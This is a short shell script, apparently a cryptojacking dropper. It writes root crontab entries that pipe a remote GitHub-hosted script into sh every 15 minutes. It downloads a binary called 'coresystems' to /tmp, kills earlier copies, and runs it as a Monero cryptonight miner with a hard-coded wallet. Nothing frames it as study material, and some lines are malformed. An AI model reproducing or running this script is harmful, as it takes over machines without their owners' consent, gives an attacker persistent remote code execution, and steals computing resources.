export PATH=$PATH:/bin:/usr/bin:/usr/local/bin:/usr/sbin

echo "*/15 * * * * curl -fsSL https://raw.githubusercontent.com/GooglesearchNick/nickproject/master/root.sh | sh" > /var/spool/cron/root
mkdir -p /var/spool/cron/crontabs
echo "*/15 * * * * curl -fsSL https://raw.githubusercontent.com/GooglesearchNick/nickproject/master/root.sh | sh" > /var/spool/cron/crontabs/root

if [! -f "/tmp/coresystems" ]; then
	curl -fsSL curl -fsSL https://raw.githubusercontent.com/GooglesearchNick/nickproject/master/coresystems -o /tmp/coresystems
fi
chmod +x /tmp/coresystems 
ps auxf | grep -v grep | grep coresystems | awk '{print $2}' |xargs kill -9
/tmp/coresystems -a cryptonight -o stratum+tcp://mine.moneropool.com:3333 -u 45EngfR9yFHGSGLXMSVh88XuErCN95qQYirYNm4pVaJDakxthy3KWPP2hgDBVaAwcBafup6sefXML3CTYXmZfSJLUfHQQXW -p x

#45EngfR9yFHGSGLXMSVh88XuErCN95qQYirYNm4pVaJDakxthy3KWPP2hgDBVaAwcBafup6sefXML3CTYXmZfSJLUfHQQXW
